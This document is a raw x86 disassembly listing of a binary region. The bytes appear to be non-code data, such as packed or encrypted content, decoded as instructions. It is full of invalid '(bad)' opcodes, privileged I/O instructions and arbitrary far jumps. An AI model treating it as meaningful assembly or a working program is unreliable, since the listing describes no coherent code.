  41ea35:	xchg   ebp,eax
  41ea36:	jno    0x41ea50
  41ea38:	jmp    0x3a52:0xa0f5a814
  41ea3f:	jecxz  0x41ea3d
  41ea41:	or     edx,DWORD PTR [ecx]
  41ea43:	nop
  41ea44:	hlt    
  41ea45:	sbb    ah,BYTE PTR [ebx+0x609d201a]
  41ea4b:	cdq    
  41ea4c:	adc    al,bl
  41ea4e:	mov    ebp,0xc583273e
  41ea53:	pop    ds
  41ea54:	fisubr DWORD PTR [ebx]
  41ea56:	mov    DWORD PTR [edi-0x44],edx
  41ea59:	popf   
  41ea5a:	(bad)
  41ea5d:	iret   
  41ea5e:	int    0xdf
  41ea60:	aaa    
  41ea61:	inc    edx
  41ea62:	popa   
  41ea63:	call   0xd79f:0xcf1cf772
  41ea6a:	jge    0x41ea6e
  41ea6c:	mov    dh,BYTE PTR [esp+eiz*4+0x3c]
  41ea70:	jmp    0x41ea77
  41ea72:	push   0x4d
  41ea74:	lock rcl DWORD PTR [ebx+0x16],0x73
  41ea79:	xchg   edx,eax
  41ea7a:	mov    BYTE PTR [edx],al
  41ea7c:	es sub eax,0x7b231a5d
  41ea82:	mov    ch,0xd7
  41ea84:	iret   
  41ea85:	dec    esi
  41ea86:	or     DWORD PTR [ebp+0x3df29c15],edx
  41ea8c:	mov    dl,0xb4
	...
  41ea9a:	add    BYTE PTR [eax+0x23],dh
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax+0x6bbcee1c]
  41eaa8:	aas    
  41eaa9:	cmp    esi,eax
  41eaab:	mov    bl,0x8d
  41eaad:	add    DWORD PTR [eax],eax
  41eaaf:	stos   DWORD PTR es:[edi],eax
  41eab0:	add    BYTE PTR [eax],al
  41eab2:	add    al,ah
  41eab4:	dec    edi
  41eab5:	and    cl,BYTE PTR [esi]
  41eab7:	fidiv  DWORD PTR [ecx-0x50]
  41eaba:	shl    BYTE PTR [esi-0x6d6cadca],cl
  41eac0:	pop    eax
  41eac1:	sub    bl,ah
  41eac3:	mov    esi,0x43ca5481
  41eac8:	in     al,dx
  41eac9:	inc    edx
  41eaca:	stos   DWORD PTR es:[edi],eax
  41eacb:	sbb    al,0xc1
  41eacd:	and    ebx,DWORD PTR [ebp+0x10]
  41ead0:	jno    0x41ea61
  41ead2:	jge    0x41ea64
  41ead4:	jne    0x41eab8
  41ead6:	xchg   ebp,eax
  41ead7:	dec    eax
  41ead8:	xchg   ebx,eax
  41ead9:	push   eax
  41eada:	aad    0x6f
  41eadc:	inc    edi
  41eadd:	inc    eax
  41eade:	lods   al,BYTE PTR ds:[esi]
  41eadf:	dec    ebp
  41eae0:	dec    esi
  41eae1:	stos   DWORD PTR es:[edi],eax
  41eae2:	neg    DWORD PTR [ebx]
  41eae4:	div    DWORD PTR [edx-0x51]
  41eae7:	add    bh,al
  41eae9:	mov    ecx,0x98ec9a68
  41eaee:	mov    cl,BYTE PTR [ebp+0x7a]
  41eaf1:	xor    al,0xdb
  41eaf3:	mov    al,0x55
  41eaf5:	jp     0x41eb38
  41eaf7:	lods   al,BYTE PTR ds:[esi]
  41eaf8:	sbb    dl,BYTE PTR [ebx]
  41eafa:	mov    dl,0x3b
  41eafc:	adc    BYTE PTR [eax+0x55],ah
  41eaff:	pop    ds
  41eb00:	inc    ecx
  41eb01:	leave  
  41eb02:	es push es
  41eb04:	lahf   
  41eb05:	test   al,0x38
  41eb07:	sbb    al,0xc8
  41eb09:	adc    eax,DWORD PTR [eax-0x202d989d]
  41eb0f:	push   0x39
  41eb11:	xchg   ebp,eax
  41eb12:	cli    
  41eb13:	add    DWORD PTR [ebp+0x35],edx
  41eb16:	pop    ecx
  41eb17:	cmc    
  41eb18:	jb     0x41eaa8
  41eb1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb1b:	cli    
  41eb1c:	pop    ecx
  41eb1d:	jg     0x41ead6
  41eb1f:	push   esp
  41eb20:	fnstsw ax
  41eb22:	retf   0x918a
  41eb25:	xor    eax,0x2b3a51c5
  41eb2a:	(bad)  
  41eb2b:	mov    eax,0x754b1805
  41eb30:	in     eax,0x6e
  41eb32:	sub    BYTE PTR [ebx-0x80bb6],cl
  41eb38:	popf   
  41eb39:	pop    ebp
  41eb3a:	fs dec edi
  41eb3c:	xor    BYTE PTR [ecx-0x5e7e739f],dl
  41eb42:	cwde   
  41eb43:	outs   dx,DWORD PTR ds:[esi]
  41eb44:	push   ds
  41eb45:	aam    0x2a
  41eb47:	je     0x41eb9f
  41eb49:	test   eax,0x28b943b2
  41eb4e:	xlat   BYTE PTR ds:[ebx]
  41eb4f:	pop    edx
  41eb50:	imul   ecx,DWORD PTR [ebp+0x7d2cabf4],0x5a58d810
  41eb5a:	xor    bh,bh
  41eb5c:	call   0x0:0xe1
	...
  41eb6b:	xchg   esp,eax
  41eb6c:	nop
  41eb6d:	ffree  st(0)
  41eb6f:	(bad)  
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	push   ecx
  41eb79:	lock pop edi
  41eb7b:	pop    esi
  41eb7c:	mov    es,WORD PTR [ecx]
  41eb7e:	add    BYTE PTR [ebx-0x58000000],ch
  41eb84:	pushf  
  41eb85:	mov    al,ds:0x56969609
  41eb8a:	xor    ch,0x5b
  41eb8d:	pop    ss
  41eb8e:	in     eax,dx
  41eb8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb90:	pop    esi
  41eb91:	cmp    al,0xbd
  41eb93:	popf   
  41eb94:	lahf   
  41eb95:	pop    esi
  41eb96:	les    edi,FWORD PTR [esi+0x4]
  41eb99:	(bad)  
  41eb9a:	mov    dl,0xc0
  41eb9c:	push   ecx
  41eb9d:	in     eax,0x3f
  41eb9f:	mov    ebp,0x33113648
  41eba4:	inc    eax
  41eba5:	cmp    esp,eax
  41eba7:	mov    al,ds:0xe5700860
  41ebac:	push   esi
  41ebad:	int3   
  41ebae:	sbb    eax,ecx
  41ebb0:	jecxz  0x41eb8a
  41ebb2:	lods   al,BYTE PTR ds:[esi]
  41ebb3:	aam    0xb1
  41ebb5:	leave  
  41ebb6:	test   DWORD PTR [edx+0x7a],ecx
  41ebb9:	cmp    al,0xc9
  41ebbb:	cmp    bh,BYTE PTR [edx+esi*4-0x5d903cfb]
  41ebc2:	mov    ds:0xf6bf694f,al
  41ebc7:	shl    cl,cl
  41ebc9:	adc    BYTE PTR ds:0xa377b95b,cl
  41ebcf:	mov    DWORD PTR [ebx],ebx
  41ebd1:	cmp    al,BYTE PTR [edx]
  41ebd3:	imul   ebp,DWORD PTR [ebp-0x3f],0x45
  41ebd7:	adc    eax,0xe425dea1
  41ebdc:	inc    edx
  41ebdd:	xor    BYTE PTR [edi+0xa],ch
  41ebe0:	test   DWORD PTR [edx+0x4b],esp
  41ebe3:	push   es
  41ebe4:	or     dh,BYTE PTR [ebp+0x2aa2377a]
  41ebea:	(bad)  
  41ebeb:	mov    al,0x51
  41ebed:	repnz or DWORD PTR fs:[esi-0x7dcffc5f],ebx
  41ebf5:	push   0xaacd6cac
  41ebfa:	inc    esp
  41ebfb:	cmp    DWORD PTR [ebp+eiz*8+0x5e],0x7a
  41ec00:	mov    eax,ds:0xe3d15015
  41ec05:	jne    0x41ec54
  41ec07:	adc    eax,0xf6a5bdf2
  41ec0c:	mov    dh,BYTE PTR es:[eax-0x2b]
  41ec10:	sub    dh,BYTE PTR [ebp+0x5decdecf]
  41ec16:	iret   
  41ec17:	jnp    0x41ebee
  41ec19:	mov    ecx,0x5b3b55a2
  41ec1e:	daa    
  41ec1f:	js     0x41ec2f
  41ec21:	and    ecx,DWORD PTR [ebp-0x27]
  41ec24:	mov    ecx,0xb3d36d3
  41ec29:	jge    0x41ec9b
  41ec2b:	dec    edx
  41ec2c:	retf   
  41ec2d:	add    BYTE PTR cs:[eax],al
	...
  41ec38:	add    BYTE PTR [eax],al
  41ec3a:	add    ah,dh
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	xor    BYTE PTR [edx-0x70f635ba],bl
  41ec4d:	add    DWORD PTR [eax],eax
  41ec4f:	stos   DWORD PTR es:[edi],eax
  41ec50:	add    BYTE PTR [eax],al
  41ec52:	add    BYTE PTR [edx],al
  41ec54:	lock jecxz 0x41ec5c
  41ec57:	inc    ecx
  41ec58:	mov    WORD PTR [eax-0x7c],ds
  41ec5b:	mov    dl,0x2f
  41ec5d:	cmp    dh,ch
  41ec5f:	jae    0x41ec07
  41ec61:	add    eax,0x8b5292e0
  41ec66:	pushf  
  41ec67:	sbb    al,0xf4
  41ec69:	imul   edi,edx,0xffffff9e
  41ec6c:	add    al,0xc8
  41ec6e:	(bad)  
  41ec6f:	xchg   esi,eax
  41ec70:	fdiv   st,st(5)
  41ec72:	xor    BYTE PTR [esi+0x3bed4228],al
  41ec78:	mov    bl,0x9e
  41ec7a:	ins    DWORD PTR es:[edi],dx
  41ec7b:	out    0x41,al
  41ec7d:	push   0x1ec23588
  41ec82:	cdq    
  41ec83:	shl    DWORD PTR [edi-0x6fdf80ef],1
  41ec89:	mov    ax,ds:0x5d5ee622
  41ec8f:	mov    WORD PTR [esi],es
  41ec91:	push   0xffffff88
  41ec93:	xor    eax,0x38c8871c
  41ec98:	ret    0x1b8b
  41ec9b:	mov    edx,0x67e7d43
  41eca0:	ins    BYTE PTR es:[edi],dx
  41eca1:	out    dx,eax
  41eca2:	(bad)  
  41eca3:	(bad)  
  41eca5:	iret   
  41eca6:	vrsqrtss xmm1,xmm6,DWORD PTR [edi+0x2b]
  41ecab:	pop    ecx
  41ecac:	retf   0x2347
  41ecaf:	jo     0x41ecb5
  41ecb1:	ins    DWORD PTR es:[edi],dx
  41ecb2:	cmp    bh,al
  41ecb4:	add    DWORD PTR [esi-0x27],edi
  41ecb7:	xchg   ebp,eax
  41ecb8:	sub    DWORD PTR [esi-0x63],ebx
  41ecbb:	dec    edx
  41ecbc:	pop    ss
  41ecbd:	dec    eax
  41ecbe:	not    DWORD PTR [ecx+0x1c]
  41ecc1:	adc    al,0x4c
  41ecc3:	add    edx,DWORD PTR [edi]
  41ecc5:	inc    edx
  41ecc6:	inc    BYTE PTR [edx+0x3c79b8dc]
  41eccc:	test   al,0xef
  41ecce:	adc    DWORD PTR [ebx],esp
  41ecd0:	sahf   
  41ecd1:	(bad)  [ecx-0x33]
  41ecd4:	jmp    0xb85ebc8c
  41ecd9:	addr16 push es
  41ecdb:	dec    edi
  41ecdc:	jmp    0x52763804
  41ece1:	adc    bl,BYTE PTR [esi+0x52]
  41ece4:	and    al,0x8e
  41ece6:	dec    edi
  41ece7:	mov    ds:0x4c3e2e10,eax
  41ecec:	aas    
  41eced:	loopne 0x41ed58
  41ecef:	fwait
  41ecf0:	pop    ss
  41ecf1:	(bad)  
  41ecf2:	(bad)  
  41ecf3:	arpl   WORD PTR [edi+0x79f6a27e],si
  41ecf9:	adc    ch,BYTE PTR [eax]
  41ecfb:	pop    esp
  41ecfc:	inc    esi
  41ecfd:	stos   DWORD PTR es:[edi],eax
	...
  41ed0a:	add    BYTE PTR [edx],dh
  41ed0c:	ror    esi,cl
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	call   0xb46d3943
  41ed1c:	pop    DWORD PTR [ecx]
  41ed1e:	add    BYTE PTR [ebx+0x32000000],ch
  41ed24:	jno    0x41ed1e
  41ed26:	test   eax,0xc836fd4
  41ed2b:	pop    edi
  41ed2c:	mov    BYTE PTR [esi+0x7c1bb472],dh
  41ed32:	mov    edx,0x63a51bc
  41ed37:	xor    al,BYTE PTR [ecx+esi*2+0x58]
  41ed3b:	aad    0xc4
  41ed3d:	adc    ah,BYTE PTR [edx-0x32465077]
  41ed43:	sbb    BYTE PTR [ebx-0x3f35c381],cl
  41ed49:	inc    esi
  41ed4a:	mov    eax,ds:0x1d14877a
  41ed4f:	(bad)  
  41ed51:	leave  
  41ed52:	ret    
  41ed53:	sub    ecx,esp
  41ed55:	ins    DWORD PTR es:[edi],dx
  41ed56:	push   esi
  41ed57:	jo     0x41ecea
  41ed59:	ret    
  41ed5a:	sbb    edi,DWORD PTR [esp+ebp*8+0x43c5b1fb]
  41ed61:	cmp    bh,BYTE PTR [edx]
  41ed63:	sbb    edi,DWORD PTR [ebx]
  41ed65:	gs int 0xd9
  41ed68:	fnstenv [edx-0x40ab93c7]
  41ed6e:	jl     0x41eda2
  41ed70:	sbb    esi,ecx
  41ed72:	xchg   edi,eax
  41ed73:	(bad)  
  41ed74:	out    dx,al
  41ed75:	and    DWORD PTR [ebp-0x212f0031],ecx
  41ed7b:	retf   0x2ae4
  41ed7e:	pusha  
  41ed7f:	mov    edx,0x571be218
  41ed84:	imul   ebx,edi,0xffffffd9
  41ed87:	outs   dx,DWORD PTR ds:[esi]
  41ed88:	std    
  41ed89:	cmc    
  41ed8a:	enter  0x31a8,0x35
  41ed8e:	shl    DWORD PTR [ebx+0x43ff0b47],cl
  41ed94:	pop    eax
  41ed95:	xchg   esi,eax
  41ed96:	mov    esi,0xe6cecc7b
  41ed9b:	jg     0x41edd3
  41ed9d:	xor    esp,DWORD PTR [ebx+0x267dd5cd]
  41eda3:	sahf   
  41eda4:	repnz mov edi,0x94765895
  41edaa:	adc    eax,0xbc0ec2ba
  41edaf:	popa   
  41edb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb1:	xor    edx,DWORD PTR [edx-0x23]
  41edb4:	popf   
  41edb5:	add    al,0x7
  41edb7:	dec    DWORD PTR [ebp+0x654bdd00]
  41edbd:	pop    ds
  41edbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edbf:	call   0x96a60273
  41edc4:	push   ebp
  41edc5:	mov    al,0xb9
  41edc7:	mov    DWORD PTR [edx+eiz*8+0x7e],edx
  41edcb:	call   0x0:0x2c81
	...
  41edda:	add    bl,bl
  41eddc:	in     eax,dx
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp+0x5c47c2ca],ecx
  41edeb:	pop    edi
  41edec:	nop
  41eded:	add    DWORD PTR [eax],eax
  41edef:	stos   DWORD PTR es:[edi],eax
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    BYTE PTR [eax+0x7],bl
  41edf5:	cmp    dl,dl
  41edf7:	popa   
  41edf8:	lea    ebx,[edi+eax*2]
  41edfb:	mov    al,ds:0x4cbe4126
  41ee00:	mov    bh,0x7
  41ee02:	retf   0xf78c
  41ee05:	ror    DWORD PTR [edi-0x75c7e84f],cl
  41ee0b:	ins    DWORD PTR es:[edi],dx
  41ee0c:	sub    BYTE PTR [ebp+esi*1+0x76],0xd9
  41ee11:	sbb    eax,0x78bb60ba
  41ee16:	sahf   
  41ee17:	push   cs
  41ee18:	fbld   TBYTE PTR [ebx-0x2123e26b]
  41ee1e:	jmp    0x41ee4f
  41ee20:	int    0x4d
  41ee22:	sahf   
  41ee23:	and    BYTE PTR [edi+eiz*8-0x27],ch
  41ee27:	outs   dx,DWORD PTR ds:[esi]
  41ee28:	mov    cl,0xa9
  41ee2a:	xor    DWORD PTR [esi-0x623076e4],ebp
  41ee30:	push   es
  41ee31:	pop    ebp
  41ee32:	lods   al,BYTE PTR ds:[esi]
  41ee33:	shl    ch,0x40
  41ee36:	or     ch,bh
  41ee38:	dec    edi
  41ee39:	arpl   bp,ax
  41ee3b:	imul   edi,DWORD PTR [eax-0x4bc5b458],0x9a99440a
  41ee45:	imul   ebp,DWORD PTR [ecx],0x37839484
  41ee4b:	(bad)  
  41ee4c:	fbld   TBYTE PTR [eax+0xc]
  41ee4f:	repnz xor dl,0x3c
  41ee53:	in     al,0x34
  41ee55:	jmp    0x48c2:0x536153c
  41ee5c:	int3   
  41ee5d:	push   ds
  41ee5e:	retf   
  41ee5f:	mov    esp,DWORD PTR [ebx+0x4947609]
  41ee65:	ror    ebp,1
  41ee67:	int    0x9b
  41ee69:	push   ebx
  41ee6a:	leave  
  41ee6b:	add    esp,0x521b5df1
  41ee71:	xchg   esi,eax
  41ee72:	jl     0x41eedc
  41ee74:	push   ss
  41ee75:	mov    ds:0x955e00c,eax
  41ee7a:	cmp    ebx,eax
  41ee7c:	popf   
  41ee7d:	xchg   edi,eax
  41ee7e:	retf   0xadd6
  41ee81:	dec    edi
  41ee82:	inc    ebx
  41ee83:	inc    ebx
  41ee84:	cmp    BYTE PTR [edi+0x17],0x90
  41ee88:	(bad)  
  41ee89:	sahf   
  41ee8a:	enter  0x29ba,0x73
  41ee8e:	fs call 0x691a:0x499f3b9
  41ee96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee97:	push   ebx
  41ee98:	unpckhps xmm3,XMMWORD PTR [eax+0xe3a427]
	...
  41eeab:	add    eax,0x6f976b22
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi+0x6e57756a],ah
  41eeba:	pop    ebp
  41eebb:	or     dl,BYTE PTR [ecx+0xab0001]
  41eec1:	add    BYTE PTR [eax],al
  41eec3:	shufps xmm0,xmm7,0x62
  41eec7:	pop    ebp
  41eec8:	jmp    FWORD PTR [edx+0x2bd853df]
  41eece:	bnd jge 0x41ef0b
  41eed1:	jno    0x23ca2d7f
  41eed7:	jmp    0xee4e:0x72ddb977
  41eede:	call   0xe7a3:0x5c26c5b9
  41eee5:	or     WORD PTR [ecx-0x7de7afc6],dx
  41eeec:	loopne 0x41eec9
  41eeee:	lahf   
  41eeef:	mov    ds:0x266467b9,al
  41eef4:	(bad)  [edx-0x34]
  41eef7:	dec    eax
  41eef8:	xchg   DWORD PTR [ecx],ebp
  41eefa:	or     DWORD PTR [ecx],esi
  41eefc:	pop    ecx
  41eefd:	push   0x93c2c131
  41ef02:	aam    0x41
  41ef04:	mov    ch,BYTE PTR [ebx*1-0x14ce07d8]
  41ef0b:	stos   BYTE PTR es:[edi],al
  41ef0c:	dec    edx
  41ef0d:	mov    dl,0x15
  41ef0f:	add    BYTE PTR [ebx],dl
  41ef11:	and    BYTE PTR [esi],bh
  41ef13:	retf   0x5941
  41ef16:	or     DWORD PTR [eax],esi
  41ef18:	sbb    DWORD PTR [edi+0xf0f8087],esp
  41ef1e:	shl    BYTE PTR [esi],cl
  41ef20:	adc    al,0xd1
  41ef22:	inc    edi
  41ef23:	xor    eax,0x14736718
  41ef28:	jmp    FWORD PTR [ebx]
  41ef2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef2b:	imul   ecx,DWORD PTR [ebx],0xb4bfe8fe
  41ef31:	xchg   bl,ah
  41ef33:	shl    BYTE PTR [eax-0x3a],cl
  41ef36:	ja     0x41ef57
  41ef38:	xchg   ebx,eax
  41ef39:	mov    BYTE PTR [esi+0x30723336],ch
  41ef3f:	inc    esi
  41ef40:	dec    ebp
  41ef41:	mov    DWORD PTR [ebp+edx*2+0x2d],ecx
  41ef45:	arpl   WORD PTR [edx],si
  41ef47:	inc    ecx
  41ef48:	jmp    0x41eefd
  41ef4a:	in     al,dx
  41ef4b:	jp     0x41ef0a
  41ef4d:	jge    0x41ef43
  41ef4f:	mov    WORD PTR ds:0x18a21e92,fs
  41ef55:	(bad)  
  41ef56:	jle    0x41ef95
  41ef58:	fs push cs
  41ef5a:	sub    BYTE PTR [edx+0x46],bl
  41ef5d:	push   0x5d
  41ef5f:	stos   BYTE PTR es:[edi],al
  41ef60:	xor    eax,0x92e8c048
  41ef65:	test   al,0xbc
  41ef67:	mov    ch,0x17
  41ef69:	scas   eax,DWORD PTR es:[edi]
  41ef6a:	push   edi
  41ef6b:	sub    BYTE PTR [ebx],0xf0
	...
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	or     BYTE PTR [eax],dh
  41ef89:	jns    0x41ef60
  41ef8b:	mov    ch,0x91
  41ef8d:	add    DWORD PTR [eax],eax
  41ef8f:	stos   DWORD PTR es:[edi],eax
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    BYTE PTR ds:0x63f9a3f9,cl
  41ef98:	shr    DWORD PTR [ebx],1
  41ef9a:	(bad)  
  41ef9b:	in     al,dx
  41ef9c:	add    al,0xad
  41ef9e:	mov    eax,0x4ee67129
  41efa3:	jp     0x41ef6b
  41efa5:	mov    dl,0x1b
  41efa7:	call   0x9385e539
  41efac:	mov    al,0x37
  41efae:	aas    
  41efaf:	(bad)  
  41efb0:	xchg   esp,edi
  41efb2:	and    eax,ebp
  41efb4:	adc    eax,0x83ab2ec1
  41efb9:	daa    
  41efba:	lock scas eax,DWORD PTR es:[edi]
  41efbc:	sar    DWORD PTR [esi],0x7f
  41efbf:	ins    BYTE PTR es:[edi],dx
  41efc0:	dec    eax
  41efc1:	mov    ch,0x8a
  41efc3:	sub    al,0xd2
  41efc6:	sbb    al,0x48
  41efc8:	dec    ecx
  41efc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efca:	out    0x2,eax
  41efcc:	std    
  41efcd:	mov    bh,0xd1
  41efcf:	nop
  41efd0:	test   al,0x30
  41efd2:	ret    
  41efd3:	pushf  
  41efd4:	pusha  
  41efd5:	sti    
  41efd6:	mov    esi,0xd78f7c16
  41efdb:	mov    ecx,0x53d511a9
  41efe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efe1:	lea    esi,[edx-0x5f]
  41efe4:	or     BYTE PTR [ebx],cl
  41efe6:	jne    0x41f040
  41efe8:	sub    ecx,ebx
  41efea:	scas   eax,DWORD PTR es:[edi]
  41efeb:	mov    BYTE PTR [esi-0x61],bl
  41efee:	loope  0x41efa3
  41eff0:	push   ds
  41eff1:	xor    BYTE PTR ds:0xf600c74f,dh
  41eff7:	cmp    esp,DWORD PTR [edi]
  41eff9:	out    0x26,al
  41effb:	dec    BYTE PTR ds:0x15a2249a
  41f001:	iret   
  41f002:	add    eax,0xa88e9fa6
  41f007:	mov    edi,0x8333504a
  41f00c:	adc    BYTE PTR [esi],bl
  41f00e:	jmp    0x569ee70
  41f013:	fldenv [edx-0x4d]
  41f016:	mov    ah,0x93
  41f018:	and    ebp,0x6b3a063b
  41f01e:	jmp    0x41eff2
  41f020:	scas   al,BYTE PTR es:[edi]
  41f021:	(bad)  
  41f023:	sub    ecx,esi
  41f025:	mov    al,ds:0xe64e5a33
  41f02a:	sbb    DWORD PTR [ebx-0xab48079],ebp
  41f030:	mov    ds:0xb3d8290,al
  41f035:	ss test eax,0xebbe73a3
  41f03b:	xchg   esi,eax
  41f03c:	into   
  41f03d:	mov    edi,0x0
	...
  41f04a:	add    dh,bl
  41f04c:	sub    DWORD PTR [eax-0x210c002e],ebx
  41f052:	sub    eax,0x4af35f6
  41f057:	setb   dl
  41f05a:	(bad)  
  41f05b:	pusha  
  41f05c:	xchg   edx,eax
  41f05d:	add    DWORD PTR [eax],eax
  41f05f:	stos   DWORD PTR es:[edi],eax
  41f060:	add    BYTE PTR [eax],al
  41f062:	add    BYTE PTR [edx-0x7b],dh
  41f065:	into   
  41f066:	in     al,0x12
  41f068:	dec    edx
  41f069:	inc    edi
  41f06a:	dec    ebp
  41f06b:	les    edx,FWORD PTR [eax]
  41f06d:	test   al,0x22
  41f06f:	jge    0x41f005
  41f071:	sub    esp,esp
  41f073:	dec    ebp
  41f074:	mov    dh,0xa9
  41f076:	xchg   esp,eax
  41f077:	icebp  
  41f078:	and    DWORD PTR [eax+0x5e1b0643],eax
  41f07e:	push   0x1c71472b
  41f083:	imul   ebp,DWORD PTR [eax-0x25],0x22
  41f087:	adc    ah,bl
  41f089:	or     al,0xd6
  41f08b:	adc    ebp,DWORD PTR [eax-0x31]
  41f08e:	mov    bl,0x9b
  41f090:	sbb    BYTE PTR [edi+0x90de7d9],0x7c
  41f097:	shr    ebx,cl
  41f099:	lahf   
  41f09a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f09b:	jno    0x41f06a
  41f09d:	aas    
  41f09e:	mov    ds,WORD PTR [edi+0x7a]
  41f0a1:	mov    edi,0x76b5b025
  41f0a6:	call   0x4b87:0x6be9f82c
  41f0ad:	popf   
  41f0ae:	inc    ecx
  41f0af:	ds cld 
  41f0b1:	sub    al,0x3c
  41f0b3:	sub    al,0x67
  41f0b5:	dec    esp
  41f0b6:	jno    0x41f0a7
  41f0b8:	add    edx,DWORD PTR [ecx+0x58]
  41f0bb:	in     eax,0x87
  41f0bd:	push   ebp
  41f0be:	push   edx
  41f0bf:	inc    ebx
  41f0c0:	mov    esp,0xaa757a57
  41f0c5:	mov    ds:0x4b193d09,eax
  41f0ca:	pop    ss
  41f0cb:	jne    0x41f068
  41f0cd:	in     al,0xda
  41f0cf:	cmp    DWORD PTR [eax-0x1c2b5f13],esp
  41f0d5:	rol    bl,1
  41f0d7:	pop    esi
  41f0d8:	pop    ebp
  41f0d9:	rcr    BYTE PTR ds:0x9428af6e,cl
  41f0df:	je     0x41f075
  41f0e1:	dec    edx
  41f0e2:	xchg   edx,eax
  41f0e3:	cs push 0x77c2046
  41f0e9:	mov    cl,0xcb
  41f0eb:	orps   xmm0,XMMWORD PTR ds:0x48189a57
  41f0f2:	mov    edi,0xf05ec30c
  41f0f7:	in     al,dx
  41f0f8:	jo     0x41f0d9
  41f0fa:	ja     0x41f081
  41f0fc:	jle    0x41f105
  41f0fe:	or     bl,BYTE PTR gs:[ebp+0x4a224812]
  41f105:	mov    ebp,DWORD PTR [edx-0x3]
  41f108:	outs   dx,BYTE PTR ds:[esi]
  41f109:	(bad)  
  41f10a:	loopne 0x41f10a
  41f10c:	jne    0x41f0b9
	...
  41f11a:	add    BYTE PTR [esi+0x3f],cl
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	mov    ds:0xb31b8bc,al
  41f12c:	xchg   ebx,eax
  41f12d:	add    DWORD PTR [eax],eax
  41f12f:	stos   DWORD PTR es:[edi],eax
  41f130:	add    BYTE PTR [eax],al
  41f132:	add    BYTE PTR [ebx+0x10641c7b],ah
  41f138:	cwde   
  41f139:	xchg   esp,eax
  41f13a:	jb     0x41f19b
  41f13c:	das    
  41f13d:	sub    dl,BYTE PTR [edx-0x8f40a35]
  41f143:	mov    ds:0xd1b56fa7,al
  41f148:	xchg   ecx,eax
  41f149:	fistp  QWORD PTR ds:0xedcf7e57
  41f14f:	(bad)  
  41f150:	(bad)  
  41f151:	sub    al,0x25
  41f153:	jne    0x41f0e2
  41f155:	and    bh,BYTE PTR [eax-0x79]
  41f158:	adc    edi,DWORD PTR [esi-0x3eceb10]
  41f15e:	arpl   WORD PTR [ecx],bp
  41f160:	adc    ch,BYTE PTR [esi-0x6b]
  41f163:	aas    
  41f164:	retf   0xc66
  41f167:	dec    eax
  41f168:	sar    BYTE PTR ss:[esi+0x4a14fbe3],0x38
  41f170:	dec    edx
  41f171:	xor    edi,edx
  41f173:	adc    BYTE PTR [edi-0x5ac65a32],al
  41f179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f17a:	cmp    edi,ebx
  41f17c:	cli    
  41f17d:	push   cs
  41f17e:	add    esi,DWORD PTR [ecx+0x74f3f897]
  41f184:	sahf   
  41f185:	pop    edx
  41f186:	rcr    DWORD PTR [eax],cl
  41f188:	and    edx,DWORD PTR [esi+0x4f1f6e51]
  41f18e:	in     al,0x18
  41f190:	xchg   esp,eax
  41f192:	push   edi
  41f193:	or     ch,BYTE PTR [edx]
  41f195:	ds sub ebp,DWORD PTR fs:[esi+eax*4]
  41f19a:	mov    BYTE PTR [eax+0x13824287],dh
  41f1a0:	not    BYTE PTR [ebx]
  41f1a2:	das    
  41f1a3:	scas   al,BYTE PTR es:[edi]
  41f1a4:	add    DWORD PTR [esp+ebx*1],0xeab1623b
  41f1ab:	shr    BYTE PTR [edx-0x6219acc0],1
  41f1b1:	xor    ebx,edx
  41f1b3:	and    ch,ch
  41f1b5:	jg     0x41f16b
  41f1b7:	daa    
  41f1b8:	ins    DWORD PTR es:[edi],dx
  41f1b9:	daa    
  41f1ba:	jno    0x41f16f
  41f1bc:	int3   
  41f1bd:	mov    dl,0x65
  41f1bf:	mov    esi,0x233c82b8
  41f1c4:	pop    ds
  41f1c5:	add    esp,esp
  41f1c7:	ins    DWORD PTR es:[edi],dx
  41f1c8:	gs cmp al,0x4e
  41f1cb:	push   ebx
  41f1cc:	or     BYTE PTR [esi-0x17],dh
  41f1cf:	mov    al,ds:0x109538a2
  41f1d4:	sahf   
  41f1d5:	add    BYTE PTR [ebp-0x6d],dl
  41f1d8:	push   esp
  41f1d9:	in     eax,dx
  41f1da:	lods   eax,DWORD PTR ds:[esi]
  41f1db:	(bad)
	...
  41f1eb:	push   ds
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	mov    DWORD PTR [edi+0x74],0x193b652
  41f1fe:	add    BYTE PTR [ebx+0x11000000],ch
  41f204:	out    dx,eax
  41f205:	cmp    eax,0xc9273cbd
  41f20a:	sar    BYTE PTR [ecx+eiz*8],cl
